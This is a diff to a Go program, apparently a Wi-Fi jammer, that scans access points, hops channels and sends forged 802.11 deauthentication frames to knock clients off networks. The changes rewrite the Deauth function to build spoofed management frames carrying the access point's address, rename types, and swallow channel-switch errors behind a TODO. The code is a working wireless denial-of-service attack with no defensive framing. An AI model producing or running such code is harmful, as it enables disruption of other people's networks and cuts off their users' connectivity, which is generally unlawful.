@@ -3,14 +3,14 @@ package main
 import (
 	"errors"
 	"fmt"
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
 	"log"
 	"net"
 	"syscall"
 	"time"
 
 	"github.com/dauie/go-netlink/nl80211"
+	"github.com/google/gopacket"
+	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
 	"github.com/mdlayher/genetlink"
 	"github.com/mdlayher/netlink"
@@ -117,7 +117,7 @@ func (conn *JamConn) SendScanAbort() error {
 	return nil
 }
 
-func (conn *JamConn) GetScanResults() ([]Station, error) {
+func (conn *JamConn) GetScanResults() ([]Ap, error) {
 
 	encoder := netlink.NewAttributeEncoder()
 	flags := netlink.HeaderFlagsRequest | netlink.HeaderFlagsDump
@@ -285,22 +285,14 @@ func (conn *JamConn) DoAPScan(whiteList *List) (macWatch List, err error) {
 }
 
 func (conn *JamConn) ChangeChanIfPast(timeout time.Duration) {
-
-	var chann Channel
-
 	if time.Since(conn.lastChanSwitch) > timeout {
-		chann = ChansG[conn.chanInx]
 		if conn.chanInx + 1 < len(ChansG) - 1 {
 			conn.chanInx += 1
 		} else {
 			conn.chanInx = 1
 		}
-		if err := conn.SetDeviceChannel(conn.chanInx + 1);
-			err != nil {
-			log.Printf("error changing frequency %s", err.Error())
-		} else {
-			log.Printf("chan switched to %dMhz", chann.CenterFreq)
-		}
+		//TODO refactor
+		_ = conn.SetDeviceChannel(conn.chanInx + 1)
 		conn.lastChanSwitch = time.Now()
 	}
 }
@@ -309,7 +301,7 @@ func (conn *JamConn) DeauthClientsIfPast(timeout time.Duration, apList *List) er
 
 	if time.Since(conn.lastDeauth) > timeout {
 		for _, v := range apList.contents {
-			sta := v.(Station)
+			sta := v.(Ap)
 			for _, cli := range sta.Clients {
 				if err := conn.Deauth(&cli, sta.hwaddr); err != nil {
 					return errors.New("JamConn.Deauth() " + err.Error())
@@ -327,18 +319,25 @@ func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
 	var opts gopacket.SerializeOptions
 
 	opts.ComputeChecksums = true
-	dot11Cpy := client.dot11Hdr
-	dot11Cpy.SequenceNumber += 1
-	dot11Cpy.Type = layers.Dot11TypeMgmtDeauthentication
 	mgmt := layers.Dot11MgmtDeauthentication {
 		Reason: layers.Dot11ReasonDeauthStLeaving,
+	}
+	dot11 := layers.Dot11{
+		Type: layers.Dot11TypeMgmtDeauthentication,
+		Proto: 0,
+		Flags: layers.Dot11Flags(0),
+		DurationID: client.dot11Hdr.DurationID,
+		Address1: client.hwaddr,
+		Address2: ap,
+		Address3: ap,
+		SequenceNumber: client.dot11Hdr.SequenceNumber + 1,
+		FragmentNumber: 0,
 	}
 	buff = gopacket.NewSerializeBuffer()
 	err := gopacket.SerializeLayers(buff, opts,
 		&client.radioTapHdr,
-		&dot11Cpy,
+		&dot11,
 		&mgmt,
-		gopacket.Payload(mgmt.Payload),
 	)
 	if err != nil {
 		return errors.New("gopacket.SerializeLayers() " + err.Error())
@@ -346,7 +345,7 @@ func (conn *JamConn) Deauth(client *Client, ap net.HardwareAddr) error {
 	if err := conn.handle.WritePacketData(buff.Bytes()); err != nil {
 		return errors.New("Handle.WritePacketData() " + err.Error())
 	}
-	fmt.Printf("sent deauth from %s\n", dot11Cpy.Address1)
+	fmt.Printf("sent deauth from %s\n", client.hwaddr)
 	return nil
 }
 
